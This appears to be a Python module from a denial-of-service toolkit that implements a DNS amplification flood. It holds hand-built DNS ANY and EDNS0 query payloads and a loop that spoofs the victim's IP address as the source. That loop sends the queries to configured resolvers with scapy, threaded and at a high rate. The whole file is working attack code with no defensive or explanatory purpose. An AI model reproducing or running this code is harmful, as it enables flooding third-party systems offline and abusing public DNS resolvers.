import asyncio
import random
from scapy.all import IP, UDP, send
from src.attacks.base import AttackBase

class DnsAmplification(AttackBase):
    def __init__(self, config):
        super().__init__(config)
        self.dns_queries = [
            b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
            b"\x03www\x06google\x03com\x00\x00\xff\x00\x01",
            b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01" \
            b"\x06dnssec\x07isoc\x03org\x00\x00\xff\x00\x01" \
            b"\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x00",
            b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
            b"\x07version\x06bind\x00\x00\x10\x00\x01",
            b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
            b"\x0acloudfront\x03net\x00\x00\xff\x00\x01",
            b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01" \
            b"\x03www\x07example\x03com\x00\x00\xff\x00\x01" \
            b"\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x80"
        ]

    def _create_domain_query(self, domain: str) -> bytes:
        query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        for part in domain.split("."):
            query += bytes([len(part)]) + part.encode()
        query += b"\x00\x00\xff\x00\x01"
        return query

    async def attack_loop(self):
        print("Starte DNS-Amplification Angriff...")
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        if self.config.custom_domains:
            for domain in self.config.custom_domains:
                try:
                    query = self._create_domain_query(domain)
                    self.dns_queries.append(query)
                except Exception as e:
                    print(f"Fehler beim Erstellen der DNS-Abfrage für {domain}: {e}")
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                dns_server = random.choice(self.config.dns_servers)
                dns_query = random.choice(self.dns_queries)
                src_ip = self.config.target if self.config.use_ip_spoofing else None
                src_port = self._get_random_port()
                ttl = self._get_random_ttl() if self.config.ttl_variation else None
                ip_params = {"dst": dns_server}
                if src_ip:
                    ip_params["src"] = src_ip
                if ttl:
                    ip_params["ttl"] = ttl
                if self.task_queue:
                    await self.task_queue.put((
                        lambda ip=ip_params, sp=src_port, dq=dns_query:
                        send(
                            IP(**ip) / UDP(sport=sp, dport=53) / dq,
                            verbose=False
                        ),
                        ()
                    ))
                else:
                    await loop.run_in_executor(
                        executor,
                        lambda: send(
                            IP(**ip_params) / UDP(sport=src_port, dport=53) / dns_query,
                            verbose=False
                        )
                    )
                self.stats.update_sent(1, len(dns_query) + 28)
                await asyncio.sleep(0.01)
